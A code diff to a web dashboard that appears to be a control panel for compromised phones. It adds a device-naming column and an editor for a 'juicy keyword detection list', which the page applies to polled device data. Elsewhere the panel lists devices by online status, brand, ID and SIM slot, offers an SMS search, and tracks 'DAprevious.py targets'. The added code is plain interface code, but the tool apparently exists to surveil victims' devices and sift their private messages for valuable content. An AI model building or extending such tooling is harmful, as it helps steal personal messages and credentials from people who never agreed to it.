@@ -132,6 +132,21 @@
                   padding:2px 7px; font-size:11px; cursor:pointer; }
   .sim-save-btn:hover { opacity:.85; }
 
+  /* ── Name inline edit ── */
+  .name-cell { min-width:90px; }
+  .name-display { cursor:pointer; color:var(--text); font-size:12px; }
+  .name-display.empty { color:var(--muted); font-style:italic; }
+  .name-display:hover { color:var(--accent); }
+  .name-edit-wrap { display:inline-flex; align-items:center; gap:3px; }
+  .name-edit-input { background:var(--bg3); border:1px solid var(--accent); border-radius:4px;
+                     color:var(--text); padding:2px 6px; font-size:12px; width:110px; outline:none; }
+
+  /* ── Keywords modal ── */
+  .kw-editor { width:100%; height:260px; background:var(--bg3); border:1px solid var(--border);
+               border-radius:6px; color:var(--text); padding:10px; font-size:13px;
+               font-family:monospace; resize:vertical; outline:none; }
+  .kw-editor:focus { border-color:var(--accent); }
+
   /* ── SMS search results ── */
   .sms-hit-card { background:var(--bg3); border:1px solid var(--border); border-radius:8px;
                   padding:10px 14px; margin-bottom:8px; }
@@ -200,6 +215,11 @@
         <div class="hc-title">Old URLs</div>
         <div class="hc-sub">DAprevious.py targets<br>IDs 20–100</div>
       </div>
+      <div class="home-card" onclick="openKeywordsModal()">
+        <div class="hc-icon">🔑</div>
+        <div class="hc-title">Edit Keywords</div>
+        <div class="hc-sub">Manage juicy keyword<br>detection list</div>
+      </div>
     </div>
   </div>
 
@@ -234,6 +254,7 @@
         <thead>
           <tr>
             <th>#</th>
+            <th>Name</th>
             <th>Status</th>
             <th>Brand</th>
             <th>Device ID</th>
@@ -300,6 +321,22 @@
   <div id="device-search-grid"></div>
 </div>
 
+<!-- ── Keywords Modal ── -->
+<div class="modal-overlay" id="keywords-modal" onclick="if(event.target===this)closeKeywordsModal()">
+  <div class="modal-box" style="max-width:560px">
+    <button class="modal-close" onclick="closeKeywordsModal()">✕ Close</button>
+    <h3>🔑 Juicy Keywords</h3>
+    <p style="color:var(--muted);font-size:12px;margin:8px 0 10px">One keyword per line. Case-insensitive. Changes apply to next poll cycle.</p>
+    <textarea class="kw-editor" id="kw-textarea" spellcheck="false" placeholder="Loading…"></textarea>
+    <div style="margin-top:10px;display:flex;gap:8px;align-items:center">
+      <button class="btn" onclick="saveKeywords()">💾 Save</button>
+      <button class="btn btn-ghost" onclick="closeKeywordsModal()">Cancel</button>
+      <span id="kw-count" style="color:var(--muted);font-size:12px;margin-left:auto"></span>
+      <span id="kw-status" style="color:var(--green);font-size:12px"></span>
+    </div>
+  </div>
+</div>
+
 <script>
 let allUrls = [];
 let currentDevices = [];
@@ -307,6 +344,7 @@ let currentUrlId = 0;
 let activeFilter = 'all';
 let currentSort = 'total';
 let currentMode = 'new'; // 'new' | 'old'
+let currentDeviceNames = {}; // { deviceId: name }
 
 // ── Mode switching ────────────────────────────────────────────────────────────
 function apiPrefix() { return currentMode === 'old' ? '/api/old' : '/api'; }
@@ -510,13 +548,19 @@ async function openUrl(id) {
   document.getElementById('view-devices').classList.add('active');
   clearSmsSearch();
   document.getElementById('device-table-wrap').style.display = '';
-  document.getElementById('device-tbody').innerHTML = `<tr><td colspan="12"><div class="loading"><div class="spinner"></div><br>Loading devices…</div></td></tr>`;
+  document.getElementById('device-tbody').innerHTML = `<tr><td colspan="13"><div class="loading"><div class="spinner"></div><br>Loading devices…</div></td></tr>`;
   currentUrlId = id;
 
   const res = await fetch(`${apiPrefix()}/url/${id}`);
   const data = await res.json();
   currentDevices = data.devices || [];
   loadSimOverridesFromStorage(); // merge any locally saved SIM overrides
+
+  // Load device names for this URL
+  try {
+    const nr = await fetch(`/api/names/${id}`);
+    currentDeviceNames = await nr.json();
+  } catch { currentDeviceNames = {}; }
 
   const online  = currentDevices.filter(d => d.status === 'online').length;
   const offline = currentDevices.length - online;
@@ -565,7 +609,7 @@ function renderDevices() {
 
   const tbody = document.getElementById('device-tbody');
   if (!list.length) {
-    tbody.innerHTML = `<tr><td colspan="12" style="text-align:center;padding:40px;color:var(--muted)">No devices match this filter</td></tr>`;
+    tbody.innerHTML = `<tr><td colspan="13" style="text-align:center;padding:40px;color:var(--muted)">No devices match this filter</td></tr>`;
     return;
   }
 
@@ -599,6 +643,7 @@ function renderDevices() {
 
     return `<tr>
       <td style="color:var(--muted)">${i+1}</td>
+      <td class="name-cell">${nameCell(d.deviceId)}</td>
       <td><span class="status-dot ${isOn?'dot-online':'dot-offline'}"></span>${isOn?'Online':'Offline'}</td>
       <td>${d.brand}</td>
       <td><code style="font-size:11px;color:var(--muted)">${d.deviceId.slice(0,16)}</code></td>
@@ -803,6 +848,90 @@ async function searchDeviceGlobal(q) {
     grid.innerHTML = '';
   }
 }
+
+// ── Name inline edit ──────────────────────────────────────────────────────────
+function nameCell(deviceId) {
+  const name = currentDeviceNames[deviceId] || '';
+  const esc = s => s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+  if (name) {
+    return `<span class="name-display" title="Click to edit" onclick="startNameEdit('${deviceId}',this)">${esc(name)}</span>`;
+  }
+  return `<span class="name-display empty" title="Click to add name" onclick="startNameEdit('${deviceId}',this)">—</span>`;
+}
+
+function startNameEdit(deviceId, el) {
+  const current = currentDeviceNames[deviceId] || '';
+  const esc = s => s.replace(/"/g,'&quot;');
+  const wrap = el.parentElement;
+  wrap.innerHTML = `
+    <div class="name-edit-wrap">
+      <input class="name-edit-input" id="name-inp-${deviceId}" type="text"
+             value="${esc(current)}" placeholder="Enter name…" maxlength="40"
+             onkeydown="if(event.key==='Enter')saveNameEdit(event,'${deviceId}');if(event.key==='Escape')renderDevices()">
+      <button class="sim-save-btn" onclick="saveNameEdit(event,'${deviceId}')">✓</button>
+      <button class="sim-edit-btn" onclick="renderDevices()" title="Cancel">✕</button>
+    </div>`;
+  document.getElementById(`name-inp-${deviceId}`)?.focus();
+}
+
+async function saveNameEdit(evt, deviceId) {
+  evt.stopPropagation();
+  const inp = document.getElementById(`name-inp-${deviceId}`);
+  if (!inp) return;
+  const val = inp.value.trim();
+  try {
+    await fetch(`/api/names/${currentUrlId}/${encodeURIComponent(deviceId)}`,
+      { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ name: val }) });
+  } catch {}
+  if (val) currentDeviceNames[deviceId] = val;
+  else delete currentDeviceNames[deviceId];
+  renderDevices();
+}
+
+// ── Keywords Modal ────────────────────────────────────────────────────────────
+async function openKeywordsModal() {
+  document.getElementById('kw-status').textContent = '';
+  document.getElementById('kw-textarea').value = 'Loading…';
+  document.getElementById('keywords-modal').classList.add('open');
+  try {
+    const res = await fetch('/api/keywords');
+    const data = await res.json();
+    document.getElementById('kw-textarea').value = data.keywords.join('\n');
+    document.getElementById('kw-count').textContent = `${data.keywords.length} keywords`;
+  } catch (e) {
+    document.getElementById('kw-textarea').value = '';
+    document.getElementById('kw-status').textContent = `❌ Load error: ${e.message}`;
+  }
+}
+
+function closeKeywordsModal() {
+  document.getElementById('keywords-modal').classList.remove('open');
+}
+
+async function saveKeywords() {
+  const raw = document.getElementById('kw-textarea').value;
+  const keywords = raw.split('\n').map(s => s.trim().toLowerCase()).filter(Boolean);
+  document.getElementById('kw-count').textContent = `${keywords.length} keywords`;
+  try {
+    const res = await fetch('/api/keywords', {
+      method: 'POST', headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({ keywords })
+    });
+    const data = await res.json();
+    if (data.ok) {
+      document.getElementById('kw-status').textContent = '✅ Saved!';
+      setTimeout(() => document.getElementById('kw-status').textContent = '', 2500);
+    }
+  } catch (e) {
+    document.getElementById('kw-status').textContent = `❌ ${e.message}`;
+  }
+}
+
+// Update textarea count as user types
+document.getElementById('kw-textarea')?.addEventListener('input', () => {
+  const n = document.getElementById('kw-textarea').value.split('\n').filter(s=>s.trim()).length;
+  document.getElementById('kw-count').textContent = `${n} keywords`;
+});
 
 // ── SIM inline edit ───────────────────────────────────────────────────────────
 // localStorage key: simov_<mode>_<urlId>_<deviceId>_<slot>
